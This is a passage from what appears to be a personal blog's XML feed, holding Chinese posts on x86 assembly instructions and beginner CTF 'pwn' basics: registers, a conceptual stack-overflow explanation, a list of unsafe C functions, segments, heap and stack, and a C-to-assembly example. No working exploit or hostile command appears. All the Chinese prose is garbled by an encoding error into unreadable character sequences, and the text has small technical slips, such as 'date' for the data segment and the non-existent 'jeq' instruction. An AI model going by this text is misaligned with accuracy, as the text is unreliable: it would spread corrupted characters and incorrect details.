å¦‚æœEAXçš„ä¸­çš„å€¼å°äºæˆ–ç­‰äºEBXä¸­çš„å€¼ï¼Œè·³è‡³æ ‡ç­¾doneã€‚å¦åˆ™ï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤<br></code></pre></td></tr></table></figure><h4 id="cmp-æ¯”è¾ƒ"><a href="#cmp-æ¯”è¾ƒ" class="headerlink" title="cmp-æ¯”è¾ƒ"></a>cmp-æ¯”è¾ƒ</h4><p>æ¯”è¾ƒä¸¤ä¸ªæŒ‡å®šæ“ä½œå¯¹è±¡çš„å€¼ï¼Œé€‚å½“è®¾ç½®æœºå™¨çŠ¶æ€å­—ä¸­çš„æ¡ä»¶ä»£ç ã€‚æ­¤æŒ‡ä»¤ç­‰åŒäºsubæŒ‡ä»¤ï¼Œä¸åŒä¹‹å¤„åœ¨äºå°†ä¸¢å¼ƒå‡æ³•ç»“æœï¼Œè€Œä¸æ˜¯æ›¿æ¢ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp &lt;reg&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;mem&gt;<br>cmp &lt;mem&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp DWORD PTR [var], 10<br>jeq loop ; å¦‚æœå­˜å‚¨åœ¨varä¸­çš„4ä¸ªå­—èŠ‚çš„å€¼ç­‰äº4å­—èŠ‚æ•´æ•°å¸¸é‡10ï¼Œåˆ™è·³è½¬åˆ°æ ‡è®°ä¸ºloopçš„ä½ç½®<br></code></pre></td></tr></table></figure><h4 id="call-ret-å­ç¨‹åºè°ƒç”¨å’Œè¿”å›"><a href="#call-ret-å­ç¨‹åºè°ƒç”¨å’Œè¿”å›" class="headerlink" title="call, ret-å­ç¨‹åºè°ƒç”¨å’Œè¿”å›"></a>call, ret-å­ç¨‹åºè°ƒç”¨å’Œè¿”å›</h4><p>è¿™äº›æŒ‡ä»¤å®ç°ä¸€ä¸ªå­ç¨‹åºè°ƒç”¨å’Œè¿”å›ã€‚</p><p>callæŒ‡ä»¤é¦–å…ˆå°†å½“å‰ä»£ç ä½ç½®å‹å…¥åˆ°å†…å­˜ä¸­ç¡¬ä»¶æ”¯æŒçš„å †æ ˆä¸­ï¼Œç„¶åæ— æ¡ä»¶è·³è½¬åˆ°æ ‡ç­¾æ“ä½œå¯¹è±¡æŒ‡ç¤ºçš„ä»£ç ä½ç½®ã€‚ä¸ç®€å•çš„è·³è½¬æŒ‡ä»¤ä¸åŒï¼ŒcallæŒ‡ä»¤ä¿å­˜å½“å‰ä½ç½®ï¼Œå¹¶åœ¨å­ç¨‹åºå®Œæˆæ—¶è¿”å›åˆ°æ­¤å¤„ã€‚</p><p>retæŒ‡ä»¤å®ç°å­ç¨‹åºè¿”å›æœºåˆ¶ã€‚æ­¤æŒ‡ä»¤é¦–å…ˆä»ç¡¬ä»¶æ”¯æŒçš„å†…å­˜å †æ ˆä¸­å¼¹å‡ºä»£ç ä½ç½®ï¼Œç„¶åæ— æ¡ä»¶è·³è½¬è‡³è¯¥ä»£ç ä½ç½®ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call &lt;label&gt;<br>ret<br></code></pre></td></tr></table></figure><hr><p>æœ€è¿‘ä¸€ç›´è¢«é—®x86å­¦å®Œäº†æ²¡ï¼Œè¿™ç®—å­¦å®Œå­ï¼ˆå°å£°bb)ğŸ¤¨</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>x86æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨PWNçš„è¾¹ç¼˜ç–¯ç‹‚è¯•æ¢</title>
    <link href="/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/"/>
    <url>/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<p>ä¸€ç‚¹ç‚¹ pwn åŸºç¡€â€”â€”æ ˆå’Œå †ã€æ±‡ç¼–åŸºç¡€å’ŒLinuxå¸¸ç”¨ä¿æŠ¤æœºåˆ¶</p><span id="more"></span><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>PWNæ˜¯ä¸€ä¸ªé»‘å®¢è¯­æ³•çš„ä¿šè¯­è¯ ï¼Œæ˜¯æŒ‡æ”»ç ´è®¾å¤‡æˆ–è€…ç³»ç»Ÿ ã€‚å‘éŸ³ç±»ä¼¼â€ç °â€ï¼Œå¯¹é»‘å®¢è€Œè¨€ï¼Œè¿™å°±æ˜¯æˆåŠŸå®æ–½é»‘å®¢æ”»å‡»çš„å£°éŸ³â€“ç °çš„ä¸€å£°ï¼Œè¢«â€é»‘â€çš„ç”µè„‘æˆ–æ‰‹æœºå°±è¢«ä½ æ“çºµäº† ã€‚</p><p>ï¼ˆä¸Šæ–‡æ¥è‡ªç™¾åº¦ï¼‰</p><p>ä¸ªäººè®¤ä¸ºè§£å†³PWNé¢˜å°±æ˜¯åˆ©ç”¨ç®€å•çš„é€†å‘å¾—åˆ°ä»£ç ï¼Œä»ä»£ç ä¸­å‘ç°æ¼æ´ï¼Œå†é€šè¿‡äºŒè¿›åˆ¶æˆ–ç³»ç»Ÿè°ƒç”¨ç­‰æ–¹å¼åˆ©ç”¨è¿™äº›æ¼æ´è·å¾—ç›®æ ‡ä¸»æœºçš„shell ã€‚</p><p>å¾ˆé…·ï¼ï¼ï¼ï¼ï¼ğŸ˜</p><h1 id="å‰çŸ¥çŸ¥è¯†"><a href="#å‰çŸ¥çŸ¥è¯†" class="headerlink" title="å‰çŸ¥çŸ¥è¯†"></a>å‰çŸ¥çŸ¥è¯†</h1><p>å°±æ˜¯æˆ‘åªçŸ¥é“è¿™ä¹ˆå¤šå°±æ¥å­¦pwnäº†</p><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><p>å¯„å­˜å™¨æ˜¯CPUå†…éƒ¨ç”¨æ¥å­˜æ”¾æ•°æ®çš„ä¸€äº›å°å‹å­˜å‚¨åŒºåŸŸï¼Œç”¨æ¥æš‚æ—¶å­˜æ”¾å‚ä¸è¿ç®—çš„æ•°æ®å’Œè¿ç®—ç»“æœã€‚</p><p>æˆ‘ä»¬å¸¸å¸¸çœ‹åˆ° 32ä½ CPUã€64ä½ CPU è¿™æ ·çš„åç§°ï¼Œå…¶å®æŒ‡çš„å°±æ˜¯å¯„å­˜å™¨çš„å¤§å°ã€‚</p><p>Intel 32ä½ä½“ç³»ç»“æ„(ç®€ç§°IA32)å¤„ç†å™¨åŒ…å«8ä¸ªå››å­—èŠ‚å¯„å­˜å™¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/271639137915732.jpg"></p><p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä¸Šå›¾æ‰€ç¤ºçš„å‰6ä¸ªå¯„å­˜å™¨å‡å¯ä½œä¸ºé€šç”¨å¯„å­˜å™¨ä½¿ç”¨ã€‚</p><p>ç¼–è¯‘å™¨ä¼šæ ¹æ®æ“ä½œæ•°å¤§å°é€‰æ‹©åˆé€‚çš„å¯„å­˜å™¨æ¥ç”Ÿæˆæ±‡ç¼–ä»£ç ã€‚åœ¨æ±‡ç¼–è¯­è¨€å±‚é¢ï¼Œè¿™ç»„é€šç”¨å¯„å­˜å™¨ä»¥%e(AT&amp;Tè¯­æ³•)æˆ–ç›´æ¥ä»¥e(Intelè¯­æ³•)å¼€å¤´æ¥å¼•ç”¨.</p><p>ä¾‹å¦‚<code>mov $5, %eax</code>æˆ–<code>mov eax, 5</code>è¡¨ç¤ºå°†5èµ‹å€¼ç»™å¯„å­˜å™¨<strong>eax</strong>ã€‚</p><p> ä¸åŒæ¶æ„çš„CPUï¼Œå¯„å­˜å™¨åç§°è¢«æ·»åŠ ä¸åŒå‰ç¼€ä»¥æŒ‡ç¤ºå¯„å­˜å™¨çš„å¤§å°ã€‚ä¾‹å¦‚x86æ¶æ„ç”¨å­—æ¯<strong>â€œeâ€</strong>ä½œåç§°å‰ç¼€ï¼ŒæŒ‡ç¤ºå¯„å­˜å™¨å¤§å°ä¸º32ä½ï¼›x86_64æ¶æ„ç”¨å­—æ¯<strong>â€œrâ€</strong>ä½œåç§°å‰ç¼€ï¼ŒæŒ‡ç¤ºå„å¯„å­˜å™¨å¤§å°ä¸º64ä½ã€‚</p><h3 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h3><p>æ ˆæº¢å‡ºå°±æ˜¯æ•°æ®ä¼šå ç”¨ä¸€ä¸ªå­˜å‚¨ç©ºé—´ï¼Œä½†æ˜¯æˆ‘ä»¬å†™ä»£ç çš„æ—¶å€™é»˜è®¤è¾“å…¥æ•°æ®å°±æ˜¯ç¬¦åˆè§„å®šçš„æ•°æ®ï¼Œå¹¶æ²¡æœ‰å¯¹è¾“å…¥æ•°æ®è¿›è¡Œé™åˆ¶ï¼Œè¿™æ—¶è¶…å‡ºè¿™ä¸ªç©ºé—´å¤§å°çš„æ•°æ®å°±ä¼šè¾“å…¥åˆ°åˆæ³•ç©ºé—´ä»¥å¤–çš„åœ°æ–¹å¹¶é€ æˆç ´åã€‚</p><p>å€Ÿæ­¤æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è¿™ä¸ªä¸å…è®¸ç”¨æˆ·æ“ä½œçš„ç©ºé—´å†…çš„å¯„å­˜å™¨ï¼Œæ”¹å˜å¯„å­˜å™¨çš„å€¼è¾¾åˆ°ä»£ç æ‰§è¡Œçš„æ•ˆæœã€‚</p><p>é€šè¿‡å¯»æ‰¾å±é™©å‡½æ•°ï¼Œæˆ‘ä»¬å¿«é€Ÿç¡®å®šç¨‹åºæ˜¯å¦å¯èƒ½æœ‰æ ˆæº¢å‡ºï¼Œä»¥åŠæœ‰çš„è¯ï¼Œæ ˆæº¢å‡ºçš„ä½ç½®åœ¨å“ªé‡Œã€‚å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹</p><p>è¾“å…¥ï¼š</p><ul><li>getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥â€™\x00â€™</li><li>scanf</li><li>vscanf</li></ul><p>è¾“å‡ºï¼š</p><ul><li>sprintf</li></ul><p>å­—ç¬¦ä¸²ï¼š</p><ul><li>strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ°â€™\x00â€™åœæ­¢</li><li>strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ°â€™\x00â€™åœæ­¢</li><li>bcopy</li></ul><h3 id="Linuxçš„ä¸€äº›åŸºç¡€å‘½ä»¤"><a href="#Linuxçš„ä¸€äº›åŸºç¡€å‘½ä»¤" class="headerlink" title="Linuxçš„ä¸€äº›åŸºç¡€å‘½ä»¤"></a>Linuxçš„ä¸€äº›åŸºç¡€å‘½ä»¤</h3><p><code>sudo</code> ï¼šSuperUserDo åœ¨éœ€è¦æƒé™çš„å‘½ä»¤å‰ä½¿ç”¨</p><p><code>apt-get</code>ï¼šå¯ä»¥æ‰§è¡Œå®‰è£…ã€å‡çº§ã€ç”šè‡³ç§»é™¤è½¯ä»¶è¿™ç±»ä»»åŠ¡</p><p><code>grep</code>ï¼šé…åˆæ­£åˆ™è¡¨è¾¾å¼é£Ÿç”¨ï¼Œç”¨äºå¯»æ‰¾æ–‡ä»¶æˆ–å†…å®¹</p><p><code>cat</code>ï¼šæŸ¥çœ‹æ–‡ä»¶</p><p><code>rm</code>ï¼šç§»é™¤æ–‡ä»¶ï¼Œè¿˜å¯ä»¥ä½¿ç”¨**-r**æ¥è¿›è¡Œé€’å½’ç§»é™¤ï¼Œä»è€Œç§»é™¤æ•´ä¸ªæ–‡ä»¶å¤¹</p><p><code>cp</code>ï¼šæ‹·è´æ–‡ä»¶</p><p><code>ls</code>ï¼šæŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><del>æš‚æ—¶åªæƒ³èµ·è¿™ä¹ˆå¤š</del></p><h1 id="æ±‡ç¼–åŸºç¡€"><a href="#æ±‡ç¼–åŸºç¡€" class="headerlink" title="æ±‡ç¼–åŸºç¡€"></a>æ±‡ç¼–åŸºç¡€</h1><blockquote><p>pwn ç ”ç©¶äºŒè¿›åˆ¶è¿˜æ˜¯è¦å­¦ä¹ åº•å±‚è®¡ç®—æœºè¯­è¨€çš„ğŸ˜¢</p></blockquote><p>æ±‡ç¼–è¯­è¨€æ˜¯äºŒè¿›åˆ¶æŒ‡ä»¤çš„æ–‡æœ¬å½¢å¼ï¼Œä¸æŒ‡ä»¤æ˜¯ä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚æ¯”å¦‚ï¼ŒåŠ æ³•æŒ‡ä»¤<code>00000011</code>å†™æˆæ±‡ç¼–è¯­è¨€å°±æ˜¯ <code>ADD</code>ã€‚</p><h3 id="å †å’Œæ ˆ"><a href="#å †å’Œæ ˆ" class="headerlink" title="å †å’Œæ ˆ"></a>å †å’Œæ ˆ</h3><h4 id="æ®µ"><a href="#æ®µ" class="headerlink" title="æ®µ"></a>æ®µ</h4><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç¨‹åºéƒ½æ˜¯ç”±bssæ®µï¼Œtextæ®µå’Œdateæ®µä¸‰ä¸ªæ®µç»„æˆã€‚</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/11.png"></p><p>bss æ®µï¼šåªæœ‰å®šä¹‰è€Œæ²¡æœ‰èµ‹åˆå€¼çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ã€‚</p><p>data æ®µï¼šå­˜æ”¾åœ¨ç¼–è¯‘é˜¶æ®µ (è€Œéè¿è¡Œæ—¶) å°±èƒ½ç¡®å®šçš„æ•°æ®ï¼Œå¯è¯»å¯å†™ã€‚å°±æ˜¯é€šå¸¸æ‰€è¯´çš„<strong>é™æ€å­˜å‚¨åŒº</strong>ï¼Œå­˜å‚¨èµ‹äº†åˆå€¼çš„å…¨å±€å˜é‡å’Œèµ‹åˆå€¼çš„é™æ€å˜é‡ä»¥åŠå¸¸é‡ã€‚</p><p>text æ®µï¼šæ”¾<strong>ç¨‹åºä»£ç </strong>ï¼Œåœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œåªè¯»ã€‚</p><h5 id="bssæ®µ"><a href="#bssæ®µ" class="headerlink" title=".bssæ®µ"></a>.bssæ®µ</h5><p>bssæ®µæ˜¯ç”¨æ¥å­˜æ”¾æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸï¼Œä¸€èˆ¬åœ¨åˆå§‹åŒ–æ—¶bssæ®µéƒ¨åˆ†ä¼šæ¸…é›¶ã€‚</p><h5 id="textæ®µ"><a href="#textæ®µ" class="headerlink" title=".textæ®µ"></a>.textæ®µ</h5><p>å­˜æ”¾ç¨‹åºä»£ç çš„åŒºåŸŸï¼Œåœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œåªè¯»ã€‚</p><p>æ›´è¿›ä¸€æ­¥è®²æ˜¯å­˜æ”¾å¤„ç†å™¨çš„æœºå™¨æŒ‡ä»¤ï¼Œå½“å„ä¸ªæºæ–‡ä»¶å•ç‹¬ç¼–è¯‘ä¹‹åç”Ÿæˆç›®æ ‡æ–‡ä»¶ï¼Œç»è¿æ¥å™¨è¿æ¥å„ä¸ªç›®æ ‡æ–‡ä»¶å¹¶è§£å†³å„ä¸ªæºæ–‡ä»¶ä¹‹é—´çš„å‡½æ•°å¼•ç”¨ã€‚ä¸æ­¤åŒæ—¶ï¼Œè¿˜è¦å°†æ‰€æœ‰ç›®æ ‡æ–‡ä»¶ä¸­çš„.textæ®µåˆåœ¨ä¸€èµ·ï¼Œä½†ä¸æ˜¯ç®€å•çš„å°†ä»–ä»¬â€œå †â€åœ¨ä¸€èµ·ï¼Œè¿˜è¦å¤„ç†å„ä¸ªæ®µä¹‹é—´å‡½æ•°å¼•ç”¨é—®é¢˜ã€‚</p><h5 id="dateæ®µ"><a href="#dateæ®µ" class="headerlink" title=".dateæ®µ"></a>.dateæ®µ</h5><p>ç”¨äºå­˜æ”¾åœ¨ç¼–è¯‘é˜¶æ®µï¼ˆè€Œéè¿è¡Œæ—¶ï¼‰å°±èƒ½ç¡®å®šçš„æ•°æ®ï¼Œå¯è¯»å¯å†™ã€‚ä¹Ÿæ˜¯é€šå¸¸æ‰€è¯´çš„é™æ€å­˜å‚¨åŒºï¼Œèµ‹äº†åˆå€¼çš„å…¨å±€å˜é‡ï¼Œå¸¸é‡å’Œé™æ€å˜é‡éƒ½å­˜æ”¾åœ¨è¿™ä¸ªåŒºåŸŸã€‚</p><h4 id="Heap-å †"><a href="#Heap-å †" class="headerlink" title="Heap-å †"></a>Heap-å †</h4><p>ç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šç»™å®ƒåˆ†é…ä¸€æ®µå†…å­˜ï¼Œç”¨æ¥å‚¨å­˜ç¨‹åºå’Œè¿è¡Œäº§ç”Ÿçš„æ•°æ®ã€‚è¿™æ®µå†…å­˜æœ‰èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€ï¼Œæ¯”å¦‚ä»<code>0x1000</code>åˆ°<code>0x8000</code>ï¼Œèµ·å§‹åœ°å€æ˜¯è¾ƒå°çš„é‚£ä¸ªåœ°å€(ä½ä½ï¼‰ï¼Œç»“æŸåœ°å€æ˜¯è¾ƒå¤§çš„é‚£ä¸ªåœ°å€ï¼ˆé«˜ä½ï¼‰ã€‚</p><p>ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯¹äºåŠ¨æ€çš„å†…å­˜å ç”¨è¯·æ±‚ï¼ˆæ¯”å¦‚æ–°å»ºå¯¹è±¡ï¼Œæˆ–è€…ä½¿ç”¨<code>malloc</code>å‘½ä»¤ï¼‰ï¼Œç³»ç»Ÿå°±ä¼šä»é¢„å…ˆåˆ†é…å¥½çš„é‚£æ®µå†…å­˜ä¹‹ä¸­ï¼Œåˆ’å‡ºä¸€éƒ¨åˆ†ç»™ç”¨æˆ·ï¼Œå…·ä½“è§„åˆ™æ˜¯ä»èµ·å§‹åœ°å€å¼€å§‹åˆ’åˆ†ã€‚</p><blockquote><p>å®é™…ä¸Šï¼Œèµ·å§‹åœ°å€ä¼šæœ‰ä¸€æ®µé™æ€æ•°æ®ï¼Œè¿™é‡Œå¿½ç•¥</p></blockquote><p>ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·è¦æ±‚å¾—åˆ°10ä¸ªå­—èŠ‚å†…å­˜ï¼Œé‚£ä¹ˆä»èµ·å§‹åœ°å€<code>0x1000</code>å¼€å§‹ç»™ä»–åˆ†é…ï¼Œä¸€ç›´åˆ†é…åˆ°åœ°å€<code>0x100A</code>ï¼Œå¦‚æœå†è¦æ±‚å¾—åˆ°22ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±åˆ†é…åˆ°<code>0x1020</code>ã€‚</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-38-37.png"></p><p>è¿™ç§å› ä¸ºç”¨æˆ·ä¸»åŠ¨è¯·æ±‚è€Œåˆ’åˆ†å‡ºæ¥çš„å†…å­˜åŒºåŸŸï¼Œå°±å«åš Heapï¼ˆå †ï¼‰ã€‚å®ƒç”±<strong>èµ·å§‹åœ°å€</strong>å¼€å§‹ï¼Œä»<strong>ä½ä½</strong>å‘<strong>é«˜ä½</strong>å¢é•¿ã€‚Heap çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹å°±æ˜¯<strong>ä¸ä¼šè‡ªåŠ¨æ¶ˆå¤±</strong>ï¼Œå¿…é¡»æ‰‹åŠ¨é‡Šæ”¾ï¼Œæˆ–è€…ç”±åƒåœ¾å›æ”¶æœºåˆ¶æ¥å›æ”¶ã€‚</p><h4 id="Strack-æ ˆ"><a href="#Strack-æ ˆ" class="headerlink" title="Strack-æ ˆ"></a>Strack-æ ˆ</h4><p>Stack æ˜¯ç”±äºå‡½æ•°è¿è¡Œè€Œä¸´æ—¶å ç”¨çš„å†…å­˜åŒºåŸŸã€‚Stack æ˜¯ç”±å†…å­˜åŒºåŸŸçš„<strong>ç»“æŸåœ°å€</strong>å¼€å§‹ï¼Œä»<strong>é«˜ä½</strong>å‘<strong>ä½ä½</strong>åˆ†é…ã€‚æ¯ä¸€æ¬¡å‡½æ•°æ‰§è¡Œç»“æŸï¼Œå°±è‡ªåŠ¨é‡Šæ”¾ä¸€ä¸ªå¸§ï¼Œæ‰€æœ‰å‡½æ•°æ‰§è¡Œç»“æŸï¼Œæ•´ä¸ª Stack å°±éƒ½é‡Šæ”¾äº†ã€‚</p><p>æ¯”å¦‚ï¼Œå†…å­˜åŒºåŸŸçš„ç»“æŸåœ°å€æ˜¯<code>0x8000</code>ï¼Œç¬¬ä¸€å¸§å‡å®šæ˜¯16å­—èŠ‚ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡åˆ†é…çš„åœ°å€å°±ä¼šä»<code>0x7FF0</code>å¼€å§‹ï¼›ç¬¬äºŒå¸§å‡å®šéœ€è¦64å­—èŠ‚ï¼Œé‚£ä¹ˆåœ°å€å°±ä¼šç§»åŠ¨åˆ°<code>0x7FB0</code>ã€‚</p><p>ä¸¾ä¸ªå…·ä½“çš„ğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> b=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">return</span> add_a_and_b(a,b);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œç³»ç»Ÿå¼€å§‹æ‰§è¡Œ<code>main</code>å‡½æ•°æ—¶ï¼Œä¼šä¸ºå®ƒåœ¨å†…å­˜é‡Œé¢å»ºç«‹ä¸€ä¸ªå¸§ï¼ˆframeï¼‰ï¼Œæ‰€æœ‰<code>main</code>çš„å†…éƒ¨å˜é‡ï¼ˆæ¯”å¦‚aå’Œbï¼‰éƒ½ä¿å­˜åœ¨è¿™ä¸ªå¸§é‡Œé¢ã€‚</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-50-18.png"></p><p>å½“è°ƒç”¨å…¶ä»–å‡½æ•°æ—¶ï¼Œç¨‹åºè¿è¡Œåˆ°è¿™ä¸€è¡Œï¼Œä¼šæ–°å»ºä¸€ä¸ªå¸§ã€‚æ­¤æ—¶å­˜åœ¨ä¸¤ä¸ªå¸§ï¼š<code>main</code>å’Œ<code>add_a_and_b</code>ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè°ƒç”¨æ ˆæœ‰å¤šå°‘å±‚ï¼Œå°±æœ‰å¤šå°‘å¸§ã€‚</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-49-52.png"></p><p>ç­‰åˆ°<code>add_a_and_b</code>è¿è¡Œç»“æŸï¼Œå®ƒçš„å¸§å°±ä¼šè¢«å›æ”¶ï¼Œç³»ç»Ÿä¼šå›åˆ°å‡½æ•°<code>main</code>åˆšæ‰ä¸­æ–­æ‰§è¡Œçš„åœ°æ–¹ï¼Œç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚</p><p>ç”Ÿæˆæ–°çš„å¸§ï¼Œå«åšâ€å‹æ ˆâ€ï¼Œè‹±æ–‡æ˜¯ pushï¼›æ ˆçš„å›æ”¶å«åšâ€å‡ºæ ˆâ€ï¼Œè‹±æ–‡æ˜¯ popã€‚Stack çš„ç‰¹ç‚¹å°±æ˜¯ï¼Œæœ€æ™šå…¥æ ˆçš„å¸§æœ€æ—©å‡ºæ ˆï¼ˆå› ä¸ºæœ€å†…å±‚çš„å‡½æ•°è°ƒç”¨ï¼Œæœ€å…ˆç»“æŸè¿è¡Œï¼‰ï¼Œè¿™å°±å«åšâ€<strong>åè¿›å…ˆå‡º</strong>â€œçš„æ•°æ®ç»“æ„ã€‚æ¯ä¸€æ¬¡å‡½æ•°æ‰§è¡Œç»“æŸï¼Œå°±è‡ªåŠ¨é‡Šæ”¾ä¸€ä¸ªå¸§ï¼Œæ‰€æœ‰å‡½æ•°æ‰§è¡Œç»“æŸï¼Œæ•´ä¸ª Stack å°±éƒ½é‡Šæ”¾äº†ã€‚é€šè¿‡è¿™ç§æœºåˆ¶ï¼Œå°±å®ç°äº†å‡½æ•°çš„å±‚å±‚è°ƒç”¨ï¼Œå¹¶ä¸”æ¯ä¸€å±‚éƒ½èƒ½ä½¿ç”¨è‡ªå·±çš„æœ¬åœ°å˜é‡ã€‚</p><h4 id="ä¸€ä¸ªğŸŒ°"><a href="#ä¸€ä¸ªğŸŒ°" class="headerlink" title="ä¸€ä¸ªğŸŒ°"></a>ä¸€ä¸ªğŸŒ°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add_a_and_b</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>   <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <span class="hljs-keyword">return</span> add_a_and_b(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†å…¶è½¬æ¢ä¸ºæ±‡ç¼–è¯­è¨€å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs x86">.file&quot;test.c&quot;<br>.text<br>.globladd_a_and_b<br>.typeadd_a_and_b, @function<br>add_a_and_b:<br>.LFB0:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl%edi, -4(%rbp)<br>movl%esi, -8(%rbp)<br>movl-4(%rbp), %edx<br>movl-8(%rbp), %eax<br>addl%edx, %eax<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE0:<br>.sizeadd_a_and_b, .-add_a_and_b<br>.globlmain<br>.typemain, @function<br>main:<br>.LFB1:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl$3, %esi<br>movl$2, 